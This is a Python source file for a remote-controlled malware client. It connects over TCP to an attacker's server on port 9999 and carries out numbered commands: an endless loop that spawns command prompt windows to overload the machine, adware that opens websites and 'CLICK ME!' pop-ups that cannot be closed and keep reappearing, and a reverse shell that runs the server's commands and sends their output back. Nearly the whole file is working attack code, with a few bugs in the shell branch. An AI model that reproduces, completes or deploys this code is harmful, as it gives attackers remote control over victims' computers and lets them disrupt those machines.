# Import necessary modules
import socket
import subprocess
import os
import random
import webbrowser
import time
import subprocess
import tkinter as tk

# Import specific components from modules
from threading import Thread
from queue import Queue
from tkinter import Tk, Entry, Label
from time import sleep

# Create a socket object for TCP communication
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Function to overload the system with command prompt windows
def overload():
    while True:
        # Open a new command prompt window continuously
        subprocess.Popen('start cmd', shell=True)


# Function to simulate adware behavior (opening random websites)
def adware():
    main = tk.Tk()
    main.withdraw()
    websites = ["https://github.com", "https://www.microsoft.com/en-us/windows", "https://www.youtube.com/watch?v=UbEBhC9tvs0"]
    website = random.choice(websites)
    webbrowser.open(website)

    def disable_event():
        pass

    def on_click():
        website = random.choice(websites)
        webbrowser.open_new(website)

    def open_ad():
        # Create a Tkinter window
        window = tk.Toplevel()
        window.attributes('-topmost', True)
        window.geometry("500x100")
        window.title("Click Me")

        # Choose a random image from a list
        ad_btn = tk.Button(window, width=500, height=100, text='CLICK ME!', font=('Roboto', 70), fg='RED',
                           cursor='hand2', command=on_click)
        ad_btn.pack()

        # Randomly position the window on the screen
        x = random.randint(0, 1920 - 200)
        y = random.randint(0, 1080 - 200)
        window.geometry("+{}+{}".format(x, y))

        # Continuously open the ad every 5 seconds
        window.after(5000, open_ad)
        window.protocol('WM_DELETE_WINDOW', disable_event)
        window.mainloop()

    open_ad()


# Function to receive and execute commands from the server
def recv_command():
    while True:
        # Receive data from the server
        data = s.recv(1024)

        # Check if the received data is a change directory command
        if data[:2].decode("utf-8") == 'cd':
            os.chdir(data[3:].decode("utf-8"))

        # Check if the received data is not empty
        if len(data) > 0:
            # Execute the received command using subprocess
            cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE,
                                   stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            # Capture the output of the command
            output_byte = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_byte,"utf-8")
            # Get the current working directory
            currentWD = os.getcwd() + "> "
            # Send the command output back to the server
            s.send(str.encode(output_str + currentWD))
            # Print the output locally for debugging purposes
            print(output_str)


# Server IP address and port
SERVER_IP = ""
SERVER_PORT = 9999


# Function to establish a connection with the server and handle commands
def connected():
    # Connect to the server
    s.connect((SERVER_IP, SERVER_PORT))

    # Receive initial data from the server
    data = s.recv(1024).decode()

    while True:
        # Check the received data for specific commands
        if data == '1':
            overload()
        elif data == '2':
            adware()
        elif data == '4':
            while True:
                # Receive commands from the server
                comm = s.recv(1024)
                # Check if the received command is a change directory command
                if comm[:2].decode("utf-8") == 'cd':
                    os.chdir(data[3:].decode("utf-8"))
                # Check if the received command is not empty
                if len(data) > 0:
                    # Execute the received command using subprocess
                    cmd = subprocess.Popen(comm[:].decode("utf-8"), shell=True,
                                           stdout=subprocess.PIPE,stdin=subprocess.PIPE, stderr=subprocess.PIPE)
                    # Capture the output of the command
                    output_byte = cmd.stdout.read() + cmd.stderr.read()
                    output_str = str(output_byte, "utf-8")
                    # Get the current working directory
                    currentWD = os.getcwd() + "> "
                    # Send the command output back to the server
                    s.send(str.encode(output_str + currentWD))
                    # Print the output locally for debugging purposes
                    print(output_str)
        elif data == '5':
            s.close()

# Entry point of the program
connected()
